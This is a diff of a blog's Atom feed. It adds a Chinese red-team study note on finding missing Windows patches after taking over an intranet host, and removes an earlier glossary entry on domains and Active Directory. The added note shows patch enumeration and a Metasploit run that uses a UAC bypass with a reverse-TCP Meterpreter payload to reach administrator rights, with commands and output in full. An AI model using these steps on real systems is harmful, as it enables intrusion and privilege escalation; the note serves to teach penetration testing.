@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-07-01T13:23:56.199Z</updated>
+  <updated>2021-07-06T08:07:44.619Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】14、发现主机缺失补丁</title>
+    <link href="https://www.teamssix.com/year/210706-155005.html"/>
+    <id>https://www.teamssix.com/year/210706-155005.html</id>
+    <published>2021-07-06T07:50:05.000Z</published>
+    <updated>2021-07-06T08:07:44.619Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p><h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p><pre><code>C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……</code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p><pre><code>wmic qfe get Caption,Description,HotfixID,InstalledOn</code></pre><pre><code>C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp://support.microsoft.com/?kbid=2999226  Update       KB2999226  11/26/2020http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010</code></pre><p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p><h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p><p>Sherlock 项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><p>导入脚本</p><pre><code>Import-Module .\Sherlock.ps1</code></pre><p>Sherlock 命令</p><pre><code>Find-ALLVulns    搜索所有未安装的补丁Find-MS16032    搜索单个漏洞</code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p><pre><code>msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patchesmsf6 post(windows/gather/enum_patches) &gt; set session 1session =&gt; 1msf6 post(windows/gather/enum_patches) &gt; run[+] KB2999226 installed on 11/26/2020[+] KB976902 installed on 11/21/2010[*] Post module execution completed</code></pre><p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p><p>首先查看下当前会话权限</p><pre><code>msf6 post(windows/gather/enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami /groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性====================================== ====== ============ ==============================Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组</code></pre><p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p><p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p><pre><code>meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggestermsf6 post(multi/recon/local_exploit_suggester) &gt; set session 1session =&gt; 1msf6 post(multi/recon/local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86/windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed</code></pre><p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p><pre><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/bypassuac_eventvwr[*] Using configured payload windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/bypassuac_eventvwr) &gt; set session 1session =&gt; 1msf6 exploit(windows/local/bypassuac_eventvwr) &gt; run[*] Started reverse TCP handler on 10.101.22.38:4444[*] UAC is Enabled, checking level...[+] Part of Administrators group! Continuing...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[*] Configuring payload and stager registry keys ...[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.[*] Sending stage (175174 bytes) to 172.16.214.4[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800[*] Cleaning up registry keys ...meterpreter &gt; execute -if &quot;whoami /groups&quot;Process 3048 created.Channel 1 created.组信息-----------------组名                                 类型   SID          属性==================================== ====== ============ ==========================================Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组</code></pre><p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p><h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p><p>wesng 的安装方法也很简单</p><pre><code>git clone https://github.com/bitsadmin/wesng.gitcd wesngpython wes.py --update</code></pre><p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p><pre><code>systeminfo &gt; info.txt</code></pre><p>直接使用 wesng 即可</p><pre><code>python wes.py info.txt</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png"></p><p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a></p><p><a href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
@@ -543,34 +571,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 Power</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】1、内网中常见名词解释</title>
-    <link href="https://www.teamssix.com/year/210203-192358.html"/>
-    <id>https://www.teamssix.com/year/210203-192358.html</id>
-    <published>2021-02-03T11:23:58.000Z</published>
-    <updated>2021-02-03T09:33:33.820Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p><p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p><p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p><p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p><p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p><p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p>多个域树可以组成一个域林。</p><h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p><p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p><p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p><p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E5%9F%9F%E6%9E%97.png" alt="域林"></p><h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p><p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p><p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p><h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p><p><strong>域本地组</strong></p><p>成员范围：所有的域；使用范围：自己所在的域</p><p><strong>全局组</strong></p><p>成员范围：自己所在的域；使用范围：所有的域</p><p><strong>通用组</strong></p><p>成员范围：所有的域；使用范围：所有的域</p><p><strong>A-G-DL-P 策略</strong></p><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul><blockquote><p>参考链接：</p><p><a href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a></p><p><a href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a></p><p><a href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a></p><p><a href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a></p><p><a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a></p><p><a href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;1、工作组&quot;&gt;&lt;a href=&quot;#1、工作组&quot; class=&quot;headerlink&quot; title=&quot;1、工作组&quot;&gt;&lt;/a&gt;1、工作组&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;工作组&lt;/strong&gt; &lt;code&gt;Work Group&lt;/code&gt; 是最常见最简单最普通的资源</summary>
       
     
     
